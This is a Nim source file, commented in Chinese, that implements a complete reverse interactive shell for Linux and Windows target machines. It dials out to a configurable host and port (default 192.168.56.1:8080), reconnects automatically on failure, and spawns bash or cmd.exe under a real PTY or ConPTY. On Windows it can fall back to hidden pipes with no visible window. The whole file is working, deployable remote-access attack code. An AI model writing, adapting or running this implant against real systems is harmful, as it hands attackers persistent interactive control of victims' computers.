## 反弹交互式 Shell —— Nim 实现（Linux / Windows 受控端）
##
## 针对两类现场问题的设计：
##   收不到会话：
##     * 连接超时 10s（绝不无限挂起）、TCP keepalive、断线自动重连
##     * 所有错误走 stderr（不再 except: discard 静默吞掉）
##   有会话但不可交互：
##     * Linux：forkpty 分配真 PTY —— 提示符 / Ctrl-C / su / vim 全部正常
##     * Windows：ConPTY（Win10 1809+）真控制台；不可用时自动回退管道模式
##     * 全程原始字节双向转发（poll / 线程），没有 readAll 阻塞、没有流方向错位
##
## 用法: reverse [HOST] [PORT]
## 环境: RS_HOST(默认 192.168.56.1) RS_PORT(默认 8080)
##       RS_INTERVAL(重连间隔秒，默认 5) RS_SHELL(默认 bash / cmd.exe)
##       RS_SESSIONS(最多会话数，0=无限) RS_ONCE=1(等价 1 次会话)
##       RS_NO_CHCP=1(Windows 不回退 UTF-8 代码页)

import std/[net, os, strutils]

const
  DefaultHost = "192.168.56.1"
  DefaultPort = 8080
  ConnectTimeoutMs = 10_000
  DefaultShell = when defined(windows): "cmd.exe" else: "/bin/bash"

when defined(windows):
  import std/winlean
  import std/typedthreads
  import std/times
else:
  import std/posix

type
  Config = object
    host: string
    port: Port
    interval: int
    shell: string
    maxSessions: int
    noChcp: bool
    noConPty: bool

proc getEnvInt(name: string, default: int): int =
  let v = getEnv(name, "").strip
  if v.len == 0: return default
  try: result = parseInt(v)
  except ValueError: result = default

proc loadConfig(): Config =
  var port = Port(getEnvInt("RS_PORT", DefaultPort))
  if paramCount() >= 2:
    try: port = Port(parseInt(paramStr(2).strip))
    except ValueError: discard
  let host =
    if paramCount() >= 1 and paramStr(1).strip.len > 0: paramStr(1).strip
    else: getEnv("RS_HOST", DefaultHost)
  result = Config(
    host: host,
    port: port,
    interval: max(1, getEnvInt("RS_INTERVAL", 5)),
    shell: getEnv("RS_SHELL", DefaultShell),
    maxSessions: getEnvInt("RS_SESSIONS", 0),
    noChcp: getEnv("RS_NO_CHCP", "0") == "1",
    noConPty: getEnv("RS_NO_CONPTY", "0") == "1",
  )
  if getEnv("RS_ONCE", "0") == "1":
    result.maxSessions = 1

proc connectTo(cfg: Config): Socket =
  ## 带超时的连接；失败时关闭句柄后向上抛，避免每次重试泄漏 fd。
  ## 必须用 unbuffered：buffered socket 的 recv(pointer, size) 会阻塞着凑满 size，
  ## 输入会被攒着不处理（Windows 管道模式实测会直接卡死交互）。
  result = newSocket(buffered = false)
  try:
    result.connect(cfg.host, cfg.port, timeout = ConnectTimeoutMs)
    result.setSockOpt(OptKeepAlive, true)
  except CatchableError:
    result.close()
    raise

when defined(windows):
  const
    EXTENDED_STARTUPINFO_PRESENT = 0x00080000'i32
    CREATE_NO_WINDOW = 0x08000000'i32
    STARTF_USESTDHANDLES = 0x00000100'i32
    HANDLE_FLAG_INHERIT = 1'i32
    PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016'u
    SIO_KEEPALIVE_VALS = 0x98000004'i32

  type
    Coord {.importc: "COORD", header: "<windows.h>".} = object
      X, Y: int16
    StartupInfoExW = object
      StartupInfo: STARTUPINFO
      lpAttributeList: pointer
    TcpKeepAlive = object
      onOff: int32
      keepAliveTime: int32
      keepAliveInterval: int32
    CreatePseudoConsoleFn = proc (size: Coord, hInput, hOutput: Handle,
        dwFlags: DWORD, phPC: ptr Handle): int32 {.stdcall.}
    ClosePseudoConsoleFn = proc (hPC: Handle) {.stdcall.}

  proc getModuleHandleW(lpModuleName: WideCString): Handle {.stdcall,
      dynlib: "kernel32", importc: "GetModuleHandleW".}
  proc getProcAddress(hModule: Handle, lpProcName: cstring): pointer {.stdcall,
      dynlib: "kernel32", importc: "GetProcAddress".}
  proc initializeProcThreadAttributeList(lpAttributeList: pointer,
      dwAttributeCount: DWORD, dwFlags: DWORD, lpSize: ptr uint): WINBOOL {.
      stdcall, dynlib: "kernel32", importc: "InitializeProcThreadAttributeList".}
  proc updateProcThreadAttribute(lpAttributeList: pointer, dwFlags: DWORD,
      attribute: uint, lpValue: pointer, cbSize: uint,
      lpPreviousValue: pointer, lpReturnSize: ptr uint): WINBOOL {.stdcall,
      dynlib: "kernel32", importc: "UpdateProcThreadAttribute".}
  proc deleteProcThreadAttributeList(lpAttributeList: pointer) {.stdcall,
      dynlib: "kernel32", importc: "DeleteProcThreadAttributeList".}
  proc createProcessExW(lpApplicationName: pointer, lpCommandLine: WideCString,
      lpProcessAttributes, lpThreadAttributes: pointer, bInheritHandles: WINBOOL,
      dwCreationFlags: DWORD, lpEnvironment, lpCurrentDirectory: pointer,
      lpStartupInfo: pointer, lpProcessInformation: pointer): WINBOOL {.
      stdcall, dynlib: "kernel32", importc: "CreateProcessW".}
  proc wsaIoctl(s: SocketHandle, dwIoControlCode: int32, lpvInBuffer: pointer,
      cbInBuffer: int32, lpvOutBuffer: pointer, cbOutBuffer: int32,
      lpcbBytesReturned: ptr int32, lpOverlapped: pointer,
      lpCompletionRoutine: pointer): cint {.stdcall, dynlib: "ws2_32",
      importc: "WSAIoctl".}
  proc ioctlsocket(s: SocketHandle, cmd: clong, argp: ptr culong): cint {.
      stdcall, dynlib: "ws2_32", importc: "ioctlsocket".}

  const FIONREAD = 0x4004667f'i32

  proc tuneKeepAlive(sock: Socket) =
    ## Windows：keepalive 10s 探测 / 3s 间隔，尽早发现对端消失
    var ka = TcpKeepAlive(onOff: 1, keepAliveTime: 10_000, keepAliveInterval: 3_000)
    var ret: int32
    discard wsaIoctl(sock.getFd, SIO_KEEPALIVE_VALS, addr ka, int32(sizeof(ka)),
                     nil, 0, addr ret, nil, nil)

  type
    WinCtx = ref object
      sock: Socket
      hIn: Handle          # 我们写入的一端（子进程 stdin）
      hOut: Handle         # 我们读取的一端（子进程 stdout/stderr）
      hProcess: Handle
      hPC: Handle          # ConPTY 句柄（0 = 管道模式）
      fpClose: ClosePseudoConsoleFn
      noChcp: bool
      conpty: bool         # 是否 ConPTY 模式（决定输入换行如何归一）
      done: bool           # 会话拆除标志：写线程据此退出，避免死不掉的阻塞

  proc dbg(msg: string) {.inline.} =
    if getEnv("RS_DEBUG", "0") == "1":
      stderr.writeLine("[reverse][dbg] " & msg)

  proc writeAll(h: Handle, data: string): bool =
    var off = 0
    while off < data.len:
      var written: int32
      if writeFile(h, addr data[off], int32(data.len - off), addr written, nil) == 0:
        return false
      if written <= 0: return false
      off += int(written)
    result = true

  proc pumpSocketToChild(ctx: WinCtx) {.thread.} =
    ## socket -> 子进程 stdin。
    ## 用 select 做 200ms 就绪轮询：既能及时响应 done 标志退出，
    ## 又避开了 "recv 带超时 = 读满 size 否则抛错丢数据" 的坑；
    ## socket 必须 unbuffered，否则 recv(pointer, size) 会阻塞着凑满 size。
    ## 换行归一：ConPTY 里 Enter 是 '\r'；管道模式里 cmd 以 '\n' 分行。
    try:
      var chunk = newString(8192)
      var selErrs = 0
      var hb = 0
      dbg("writer 启动")
      if not ctx.noChcp and not writeAll(ctx.hIn, "chcp 65001>nul\r\n"):
        discard
      dbg("writer chcp 完成")
      let t0 = epochTime()
      while not ctx.done:
        var fds: TFdSet
        FD_ZERO(fds)
        FD_SET(ctx.sock.getFd, fds)
        var tv = Timeval(tv_sec: 0'i32, tv_usec: 200_000'i32)
        let selRet = select(0'i32, addr fds, nil, nil, addr tv)
        if selRet <= 0:
          inc hb
          if hb <= 4:
            var avail: culong = 0
            discard ioctlsocket(ctx.sock.getFd, FIONREAD.clong, addr avail)
            dbg("writer diag iter=" & $hb & " sel=" & $selRet &
                " err=" & $getLastError() & " avail=" & $avail &
                " t=" & formatFloat(epochTime() - t0, ffDecimal, 1))
          if selRet < 0 and selErrs < 3:
            inc selErrs
            dbg("writer select 返回 " & $selRet & " err=" & $getLastError())
          continue
        let n = ctx.sock.recv(addr chunk[0], chunk.len)
        dbg("writer: recv=" & $n)
        if n <= 0: break
        let raw = chunk[0 ..< n]
        # 统一把"任何换行"归一成目标平台的终止符：
        #   ConPTY：CRLF/单 LF/单 CR -> '\r'（控制台 Enter）
        #   管道模式：CRLF/单 CR -> '\n'（cmd 管道以 LF 分行）
        let data =
          if ctx.conpty: raw.replace("\r\n", "\r").replace("\n", "\r")
          else: raw.replace("\r\n", "\n").replace("\r", "\n")
        if data.len > 0 and not writeAll(ctx.hIn, data):
          break
    except CatchableError as e:
      dbg("writer 异常: " & e.msg)
    except Defect:
      discard            # 线程里兜底，任何 Defect 都不能带走整个进程
    dbg("writer 线程退出")
    # socket 断开 / 写失败：终止子进程，让会话彻底结束（正常拆除时子进程已死）
    if not ctx.done:
      discard terminateProcess(ctx.hProcess, 1)

  proc pumpChildToSocket(ctx: WinCtx) {.thread.} =
    ## 子进程输出 -> socket：阻塞 ReadFile，进程/控制台关闭时自然 EOF
    try:
      var buf = newString(8192)
      while true:
        var nRead: int32
        if readFile(ctx.hOut, addr buf[0], int32(buf.len), addr nRead, nil) == 0:
          dbg("reader: ReadFile 结束 err=" & $getLastError())
          break
        if nRead <= 0: break
        ctx.sock.send(buf[0 ..< int(nRead)])
    except CatchableError as e:
      dbg("reader: " & e.msg)
    except Defect:
      discard
    dbg("reader 线程退出")

  proc startWithConPty(cfg: Config, ctx: WinCtx): bool =
    ## Win10 1809+：真控制台。动态取函数地址，旧系统上失败即回退
    let kernel32 = getModuleHandleW(newWideCString("kernel32.dll"))
    if kernel32 == 0: return false
    let fpCreate = cast[CreatePseudoConsoleFn](
      getProcAddress(kernel32, "CreatePseudoConsole"))
    let fpClose = cast[ClosePseudoConsoleFn](
      getProcAddress(kernel32, "ClosePseudoConsole"))
    if fpCreate == nil or fpClose == nil: return false

    var sa: SECURITY_ATTRIBUTES
    var hInRead, hInWrite, hOutRead, hOutWrite: Handle
    if createPipe(hInRead, hInWrite, sa, 0) == 0: return false
    if createPipe(hOutRead, hOutWrite, sa, 0) == 0:
      discard closeHandle(hInRead)
      discard closeHandle(hInWrite)
      return false

    var hpc: Handle
    # 给 ConPTY 的输入读端 + 输出写端；随后由 API 内部持有
    if fpCreate(Coord(X: 120'i16, Y: 30'i16), hInRead, hOutWrite,
                0'i32, addr hpc) < 0:
      discard closeHandle(hInRead)
      discard closeHandle(hInWrite)
      discard closeHandle(hOutRead)
      discard closeHandle(hOutWrite)
      return false

    var size: uint
    discard initializeProcThreadAttributeList(nil, 1, 0, addr size)
    if size == 0:
      fpClose(hpc)
      discard closeHandle(hInRead); discard closeHandle(hInWrite)
      discard closeHandle(hOutRead); discard closeHandle(hOutWrite)
      return false
    let attrList = alloc(size)
    if initializeProcThreadAttributeList(attrList, 1, 0, addr size) == 0:
      dealloc(attrList)
      fpClose(hpc)
      discard closeHandle(hInRead); discard closeHandle(hInWrite)
      discard closeHandle(hOutRead); discard closeHandle(hOutWrite)
      return false
    if updateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
                                 cast[pointer](hpc), sizeof(Handle).uint,
                                 nil, nil) == 0:
      deleteProcThreadAttributeList(attrList)
      dealloc(attrList)
      fpClose(hpc)
      discard closeHandle(hInRead); discard closeHandle(hInWrite)
      discard closeHandle(hOutRead); discard closeHandle(hOutWrite)
      return false

    var si: StartupInfoExW
    si.StartupInfo.cb = int32(sizeof(StartupInfoExW))
    si.lpAttributeList = attrList
    # 关键一步：显式声明子进程不继承我们的标准句柄。
    # 否则（父进程 stdio 是管道/文件时）Windows 会把它们原样塞给子进程，
    # cmd.exe 就绕开伪控制台写向错误的地方；起点置为 INVALID 后，
    # 系统会给子进程它自己控制台（伪控制台）的句柄。
    si.StartupInfo.dwFlags = STARTF_USESTDHANDLES
    si.StartupInfo.hStdInput = Handle(-1)
    si.StartupInfo.hStdOutput = Handle(-1)
    si.StartupInfo.hStdError = Handle(-1)
    var pi: PROCESS_INFORMATION
    let cmdLine = newWideCString(cfg.shell)
    let ok = createProcessExW(nil, cmdLine, nil, nil, 0'i32,
        EXTENDED_STARTUPINFO_PRESENT, nil, nil, addr si, addr pi)
    deleteProcThreadAttributeList(attrList)
    dealloc(attrList)
    if ok == 0:
      fpClose(hpc)
      discard closeHandle(hInRead); discard closeHandle(hInWrite)
      discard closeHandle(hOutRead); discard closeHandle(hOutWrite)
      return false

    # ConPTY 端句柄已被复制进 conhost，客户端的副本在 CreateProcess 之后即可释放
    discard closeHandle(hInRead)
    discard closeHandle(hOutWrite)
    discard closeHandle(pi.hThread)
    ctx.hIn = hInWrite
    ctx.hOut = hOutRead
    ctx.hProcess = pi.hProcess
    ctx.hPC = hpc
    ctx.conpty = true
    ctx.fpClose = fpClose
    stderr.writeLine("[reverse] ConPTY 会话已建立 (pid=" & $pi.dwProcessId & ")")
    result = true

  proc startWithPipes(cfg: Config, ctx: WinCtx): bool =
    ## 兜底：匿名管道模式（无 Ctrl-C / 无完整控制台，但命令执行可靠）
    var sa = SECURITY_ATTRIBUTES(
      nLength: int32(sizeof(SECURITY_ATTRIBUTES)),
      lpSecurityDescriptor: nil,
      bInheritHandle: 1)
    var hInRead, hInWrite, hOutRead, hOutWrite: Handle
    if createPipe(hInRead, hInWrite, sa, 0) == 0: return false
    if createPipe(hOutRead, hOutWrite, sa, 0) == 0:
      discard closeHandle(hInRead)
      discard closeHandle(hInWrite)
      return false
    # 我们持有的两端设为不可继承，否则子进程退出也检测不到 EOF
    discard setHandleInformation(hInWrite, HANDLE_FLAG_INHERIT, 0)
    discard setHandleInformation(hOutRead, HANDLE_FLAG_INHERIT, 0)

    var si: STARTUPINFO
    si.cb = int32(sizeof(STARTUPINFO))
    si.dwFlags = STARTF_USESTDHANDLES
    si.hStdInput = hInRead
    si.hStdOutput = hOutWrite
    si.hStdError = hOutWrite
    var pi: PROCESS_INFORMATION
    let ok = createProcessW(nil, newWideCString(cfg.shell), nil, nil, 1'i32,
                            CREATE_NO_WINDOW, nil, nil, si, pi)
    discard closeHandle(hInRead)     # 子进程端交给子进程
    discard closeHandle(hOutWrite)
    if ok == 0:
      discard closeHandle(hInWrite)
      discard closeHandle(hOutRead)
      return false

    discard closeHandle(pi.hThread)
    ctx.hIn = hInWrite
    ctx.hOut = hOutRead
    ctx.hProcess = pi.hProcess
    ctx.hPC = 0
    result = true

  proc runSession(cfg: Config, sock: Socket) =
    let ctx = WinCtx(sock: sock, noChcp: cfg.noChcp)
    var started = false
    if not cfg.noConPty:
      started = startWithConPty(cfg, ctx)
    if not started:
      started = startWithPipes(cfg, ctx)
      if started:
        stderr.writeLine("[reverse] 回退管道模式（无 Ctrl-C；ConPTY 需 Win10 1809+）")
    if not started:
      raise newException(OSError, "创建子进程失败")

    var tIn, tOut: Thread[WinCtx]
    createThread(tIn, pumpSocketToChild, ctx)
    createThread(tOut, pumpChildToSocket, ctx)

    # 等子进程退出（socket 断开时由写线程 TerminateProcess 触发）
    discard waitForSingleObject(ctx.hProcess, -1'i32)
    var code: int32
    discard getExitCodeProcess(ctx.hProcess, code)
    dbg("子进程退出 code=" & $code)

    # 拆除顺序（关键）：
    #   1. done 置位：写线程最多 1s 后自行退出，不需要从外部关 socket
    #   2. 关 ConPTY → reader 读到 EOF（PTY 端句柄此前已关，只剩 conhost 的复制）
    #   3. join 两个线程（此后才允许任何人碰 socket）
    #   4. 关剩余句柄
    ctx.done = true
    if ctx.hPC != 0 and ctx.fpClose != nil:
      ctx.fpClose(ctx.hPC)
      ctx.hPC = 0
    joinThread(tOut)
    joinThread(tIn)
    discard closeHandle(ctx.hIn)
    discard closeHandle(ctx.hOut)
    discard closeHandle(ctx.hProcess)

else:  # ------------------------------------------------------------------ linux

  type
    Winsize {.importc: "struct winsize", header: "<sys/ioctl.h>".} = object
      ws_row, ws_col, ws_xpixel, ws_ypixel: cushort
    PollFd {.importc: "struct pollfd", header: "<poll.h>".} = object
      fd: cint
      events: cshort
      revents: cshort

  proc forkpty(amaster: ptr cint, name: cstring, termp, winp: pointer): Pid {.
      importc: "forkpty", header: "<pty.h>".}
  proc poll(fds: ptr PollFd, nfds: culong, timeout: cint): cint {.
      importc: "poll", header: "<poll.h>".}
  proc cExit(code: cint) {.importc: "_exit", header: "<unistd.h>", noconv.}
  proc cSetsockopt(fd: cint, level, optname: cint, optval: pointer,
      optlen: cuint): cint {.importc: "setsockopt",
      header: "<sys/socket.h>", sideeffect.}

  const
    PollReadable = cshort(0x001)   # POLLIN
    PollBad = cshort(0x008 or 0x010 or 0x020)  # POLLERR|POLLHUP|POLLNVAL

  proc tuneKeepAlive(sock: Socket) =
    when defined(linux):
      let fd = cint(int(sock.getFd))
      var one: cint = 1
      var idle: cint = 15      # TCP_KEEPIDLE
      var intvl: cint = 5      # TCP_KEEPINTVL
      var cnt: cint = 3        # TCP_KEEPCNT
      discard cSetsockopt(fd, 1, 9, addr one, cuint(sizeof(one)))     # SO_KEEPALIVE
      discard cSetsockopt(fd, 6, 4, addr idle, cuint(sizeof(idle)))
      discard cSetsockopt(fd, 6, 5, addr intvl, cuint(sizeof(intvl)))
      discard cSetsockopt(fd, 6, 6, addr cnt, cuint(sizeof(cnt)))

  proc reapChild(pid: Pid) =
    ## 优先 SIGHUP 优雅退出，给 600ms，再 SIGKILL 兜底并收尸
    var status: cint
    discard kill(pid, SIGHUP)
    var reaped = false
    for _ in 0 ..< 30:
      if waitpid(pid, status, WNOHANG) == pid:
        reaped = true
        break
      sleep(20)
    if not reaped:
      discard kill(pid, SIGKILL)
      discard waitpid(pid, status, 0)

  proc forwardAll(dst: cint, data: pointer, n: int): bool =
    var off = 0
    while off < n:
      let w = write(dst, cast[pointer](cast[uint](data) + uint(off)), n - off)
      if w <= 0: return false
      off += w
    result = true

  proc runSession(cfg: Config, sock: Socket) =
    # 先建好 argv 再 fork，子进程里只做异步信号安全的事
    var argv = allocCStringArray([cfg.shell, "-i"])
    var ws = Winsize(ws_row: 30, ws_col: 120)
    var master: cint = -1
    let pid = forkpty(addr master, nil, nil, addr ws)
    if pid < 0:
      deallocCStringArray(argv)
      raise newException(OSError, "forkpty 失败")
    if pid == 0:
      discard signal(SIGPIPE, SIG_DFL)   # 父进程忽略了 SIGPIPE，这里恢复
      discard execvp(argv[0], argv)
      cExit(127)
      return
    deallocCStringArray(argv)

    let sockFd = cint(int(sock.getFd))
    var buf: array[8192, char]
    var fds: array[2, PollFd]
    while true:
      fds[0] = PollFd(fd: sockFd, events: PollReadable)
      fds[1] = PollFd(fd: master, events: PollReadable)
      if poll(addr fds[0], 2, -1) < 0: break

      var status: cint
      if waitpid(pid, status, WNOHANG) == pid: break

      var alive = true
      let re0 = fds[0].revents
      if (re0 and PollReadable) != 0:
        let n = read(sockFd, addr buf[0], buf.len)
        if n <= 0:
          alive = false
        elif not forwardAll(master, addr buf[0], n):
          alive = false
      elif (re0 and PollBad) != 0:
        alive = false

      if alive:
        let re1 = fds[1].revents
        if (re1 and PollReadable) != 0:
          let n = read(master, addr buf[0], buf.len)
          if n <= 0:
            alive = false
          elif not forwardAll(sockFd, addr buf[0], n):
            alive = false
        elif (re1 and PollBad) != 0:
          alive = false
      if not alive: break

    discard close(master)
    reapChild(pid)

proc main() =
  var cfg = loadConfig()
  when defined(windows):
    discard
  else:
    if not fileExists(cfg.shell):
      let fallback =
        if fileExists("/bin/bash"): "/bin/bash"
        elif fileExists("/bin/sh"): "/bin/sh"
        else: "/bin/sh"
      stderr.writeLine("[reverse] RS_SHELL 不存在，改用 " & fallback)
      cfg.shell = fallback
    discard signal(SIGPIPE, SIG_IGN)

  var sessions = 0
  while true:
    if cfg.maxSessions > 0 and sessions >= cfg.maxSessions: break
    var sock: Socket
    try:
      sock = connectTo(cfg)
    except CatchableError as e:
      stderr.writeLine("[reverse] 连接失败: " & e.msg)
      sleep(cfg.interval * 1000)
      continue
    sessions.inc
    try:
      try:
        tuneKeepAlive(sock)
        runSession(cfg, sock)
      finally:
        sock.close()
      stderr.writeLine("[reverse] 会话结束（已建立 " & $sessions & " 次）")
    except CatchableError as e:
      stderr.writeLine("[reverse] 会话异常: " & e.msg)
    if cfg.maxSessions > 0 and sessions >= cfg.maxSessions: break
    sleep(cfg.interval * 1000)

when isMainModule:
  main()
